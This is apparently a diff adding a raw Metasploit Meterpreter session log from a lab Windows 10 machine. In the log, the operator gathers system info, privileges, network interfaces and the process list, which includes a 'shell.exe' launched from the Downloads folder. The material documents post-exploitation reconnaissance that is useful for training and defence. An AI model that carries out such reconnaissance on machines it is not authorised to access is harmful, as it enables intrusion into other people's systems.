@@ -1,0 +1,124 @@
+meterpreter > sysinfo
+Computer        : DESKTOP-TD9BS8A
+OS              : Windows 10 (10.0 Build 10240).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: DESKTOP-TD9BS8A\test
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface  2
+============
+Name         : Microsoft Teredo Tunneling Adapter
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : 2001:0:348b:fb58:c99:948:67c5:9f4e
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+IPv6 Address : fe80::c99:948:67c5:9f4e
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+
+Interface  4
+============
+Name         : Microsoft ISATAP Adapter
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::5efe:c0a8:1f9f
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface  5
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter
+Hardware MAC : 08:00:27:56:9f:80
+MTU          : 1500
+IPv4 Address : 192.168.31.159
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : 2409:40d2:1165:afd2:570:f87d:900f:f35e
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+IPv6 Address : 2409:40d2:1165:afd2:649d:78d0:c2bb:f730
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+IPv6 Address : fe80::570:f87d:900f:f35e
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                       Arch  Session  User                  Path
+ ---   ----  ----                       ----  -------  ----                  ----
+ 0     0     [System Process]
+ 4     0     System
+ 256   556   svchost.exe
+ 272   4     smss.exe
+ 360   348   csrss.exe
+ 428   348   wininit.exe
+ 444   420   csrss.exe
+ 484   420   winlogon.exe
+ 500   4684  OneDrive.Sync.Service.exe  x86   1        DESKTOP-TD9BS8A\test  C:\Users\test\AppData\Local\Microsoft\OneDrive\25.164.0824.0003\OneDrive.Sync.Service.exe
+ 556   428   services.exe
+ 564   428   lsass.exe
+ 664   556   svchost.exe
+ 720   556   svchost.exe
+ 804   484   dwm.exe
+ 892   556   svchost.exe
+ 924   2532  MicrosoftEdgeCP.exe        x64   1        DESKTOP-TD9BS8A\test  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe
+ 944   556   svchost.exe
+ 972   556   svchost.exe
+ 996   556   svchost.exe
+ 1096  556   svchost.exe
+ 1272  556   spoolsv.exe
+ 1364  556   svchost.exe
+ 1432  556   svchost.exe
+ 1492  556   svchost.exe
+ 1556  556   svchost.exe
+ 1604  556   svchost.exe
+ 1624  556   MsMpEng.exe
+ 1980  664   SpeechRuntime.exe          x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\Speech_OneCore\Common\SpeechRuntime.exe
+ 1984  892   sihost.exe                 x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\sihost.exe
+ 2024  1440  explorer.exe               x64   1        DESKTOP-TD9BS8A\test  C:\Windows\explorer.exe
+ 2480  892   taskhostw.exe              x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\taskhostw.exe
+ 2532  664   RuntimeBroker.exe          x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\RuntimeBroker.exe
+ 2628  944   dasHost.exe
+ 3036  892   taskeng.exe
+ 3212  664   ShellExperienceHost.exe    x64   1        DESKTOP-TD9BS8A\test  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
+ 3228  2024  OneDrive.exe               x86   1        DESKTOP-TD9BS8A\test  C:\Users\test\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+ 3332  664   SearchUI.exe               x64   1        DESKTOP-TD9BS8A\test  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
+ 3584  664   SystemSettings.exe         x64   1        DESKTOP-TD9BS8A\test  C:\Windows\ImmersiveControlPanel\SystemSettings.exe
+ 3908  556   SearchIndexer.exe
+ 3928  892   taskeng.exe                x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\taskeng.exe
+ 3980  664   browser_broker.exe         x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\browser_broker.exe
+ 4116  556   sedsvc.exe
+ 4272  556   svchost.exe                x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\svchost.exe
+ 4508  664   InstallAgent.exe           x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\InstallAgent.exe
+ 4700  2024  shell.exe                  x64   1        DESKTOP-TD9BS8A\test  C:\Users\test\Downloads\shell.exe
+ 4904  664   ApplicationFrameHost.exe   x64   1        DESKTOP-TD9BS8A\test  C:\Windows\System32\ApplicationFrameHost.exe
+ 5024  664   MicrosoftEdge.exe          x64   1        DESKTOP-TD9BS8A\test  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe
